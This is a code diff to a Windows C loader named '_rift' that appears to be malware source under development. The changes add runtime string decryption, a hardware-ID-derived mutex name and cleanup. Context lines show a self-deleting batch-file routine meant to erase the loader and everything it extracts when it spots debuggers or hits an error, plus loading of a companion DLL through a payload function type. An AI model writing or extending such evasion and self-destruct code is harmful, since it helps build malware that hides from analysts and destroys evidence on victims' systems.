@@ -1,8 +1,6 @@
 #include "pch.h"
 #include "_rift.h"
 
-PVOID IDownloadKey();
-
 typedef BOOL(*pEDllInit)(PPIB);
 typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
 
@@ -16,12 +14,25 @@ INT WINAPI wWinMain(
 	UNREFERENCED_PARAMETER(nCmdShow);
 	{	// Process Information Block
 		g_PIB->hMH = hInstance;
-		GetModuleFileNameW(hInstance, g_PIB->szMFN, MAX_PATH);
 		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
-		EXoshiroBegin();
+		EXoshiroBegin(NULL);
+		IGenerateHwid(g_PIB->Hwid);
 	}
 
-	CreateMutexW(0, FALSE, L"Local\\");
+	// Create Random Mutex using Hwid
+	SIZE_T nResult;
+	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
+	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
+	StringCchCopyW(szMutex, MAX_PATH, szLocal);
+	FreeMemory(szLocal);
+	PVOID pHWID = AllocMemory(MD5_SIZE);
+	CopyMemory(pHWID, g_PIB->Hwid, MD5_SIZE);
+	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH);
+	FreeMemory(pHWID);
+	StringCchCatW(szMutex, MAX_PATH, szRandom);
+	FreeMemory(szRandom);
+
+	// CreateMutexW(0, FALSE, szMutex);
 
 	// init con
 	IOpenConsole();
@@ -54,7 +65,7 @@ INT WINAPI wWinMain(
 
 	MemoryFreeLibrary(hDll);
 #else
-	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
+	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
 	if (!dhDll)
 		return 0x2ab5;
 
@@ -71,19 +82,20 @@ INT WINAPI wWinMain(
 	FreeMemory(pDll);
 
 	{	// CleanUp
-		EXoshiroEnd();
-
+		EXoshiroEnd(NULL);
+		CloseHandle(g_PIB->hPH);
 		HANDLE hPH = GetProcessHeap();
-		HeapFree(hPH, 0, g_PIB);
+		HeapFree(hPH, NULL, g_PIB);
+		CloseHandle(hPH);
 	} return 0;
 }
 
 /*	This function basically does what it's called,
 	it "cleans" (or better purges) everything it can and tries to destroy
 	all traces of it self (the loader and everything else it extracts).
-	It should get triggered ( / called) if any fatal error occurs,
+	It should get triggered (/called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-static CONST WCHAR l_szSelfDelBat[] = {
+CONST STATIC WCHAR l_szSelfDelBat[] = {
 	L"@echo off\n"
 	L"%x:\n"
 	L"\tdel \"%s\" /f\n"
@@ -95,15 +107,14 @@ static CONST WCHAR l_szSelfDelBat[] = {
 VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
 	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
-	SIZE_T nRandom;
-	PCWSTR szRandom = EAllocRandomPathW(8, 16, &nRandom);
+	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
 	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
 	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
 	PVOID pScriptW = AllocMemory(0x800);
-	UINT uiRandomID = EXoshiroSS(0);
+	UINT uiRandomID = EXoshiroSS(NULL);
 	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
 	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
 
@@ -111,7 +122,7 @@ VOID ESelfDestruct() {
 	SIZE_T nScript;
 	StringCchLengthW(pScriptW, 0x400, &nScript);
 	PSTR pScriptA = AllocMemory(0x400);
-	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
+	WideCharToMultiByte(CP_ACP, NULL, pScriptW, -1, pScriptA, 0x400, NULL, NULL);
 	FreeMemory(pScriptW);
 
 	// Write to Disk
